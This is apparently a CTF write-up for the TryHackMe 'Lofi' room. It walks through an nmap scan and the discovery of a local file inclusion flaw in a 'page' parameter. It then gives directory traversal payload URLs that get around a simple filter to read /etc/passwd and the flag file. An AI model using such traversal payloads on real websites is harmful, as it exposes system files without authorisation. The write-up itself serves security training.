---
title: 'Lofi — Writeup'
author: n0l1v3sm4tt3r
categories: [THM]
tags: [web, lfi]
media_subpath: /images/thm-lofi/
image:
  path: thm-lofi.png
---

> **Room:** https://tryhackme.com/room/lofi  
> **Difficulty:** Easy

---

## Table of Contents

1. [Introduction](#introduction)  
2. [Recon / Basic Enumeration](#recon--basic-enumeration)  
3. [Exploring web page](#exploring-web-page)  
4. [Exploiting LFI](#exploiting-lfi)  
5. [Reading the Flag](#reading-the-flag)  

---

## Introduction

**Machine Info:**

- **Name:** Lofi  
- **Source:** TryHackMe — room `lofi`  
- **Difficulty:** Easy  

---

## Recon / Basic Enumeration

### Nmap Scan

```bash
mkdir -p nmap;nmap -A -T5 -Pn 10.10.101.21 -p- -oN nmap/total.txt
````

**Results:**

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 (Ubuntu)
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 
```

**Open Ports:**

| Port | Service                              |
| ---- | ------------------------------------ |
| 22   | SSH                                  |
| 80   | HTTP                                 

---

## Exploring web page

Visiting the web page shows a minimalistic interface with a few links like “Relax”, “Focus”, etc.

![Main page](main-page.png)

Clicking **Relax** redirects to:

```
http://10.10.101.21/?page=relax.php
```

This suggests the site dynamically loads pages based on the `page` parameter.

Trying to include a system file directly:

```
http://10.10.101.21/?page=/etc/passwd
```

returns the following message:

> **HACKKERRR!! HACKER DETECTED. STOP HACKING YOU STINKIN HACKER!**

![Hacker detected message](hacker.png)

So, there’s a simple input validation or keyword blacklist blocking absolute paths like `/etc/passwd`.

---

## Exploiting LFI

To bypass this filter, use **directory traversal sequences** (`../`) to go up in the filesystem tree.

Try this payload:

```
http://10.10.101.21/?page=../../../../../../../etc/passwd
```

The file loads successfully, confirming a **Local File Inclusion** vulnerability.

![/etc/passwd disclosure](passwd.png)

> **Explanation:**
> The `../` traversal moves the include path upward in the filesystem until it reaches the root directory, where `/etc/passwd` resides.
> The application then includes the file content in the web page response.

---

## Reading the Flag

Once the LFI is confirmed, the next step is to retrieve the flag file.
Typically, challenge flags are stored in the root directory (`/flag.txt`).

So, we try:

```
http://10.10.101.21/?page=../../../../../../../flag.txt
```

![Flag disclosure](flag.png)

The page returns the contents of `flag.txt`, completing the challenge.

---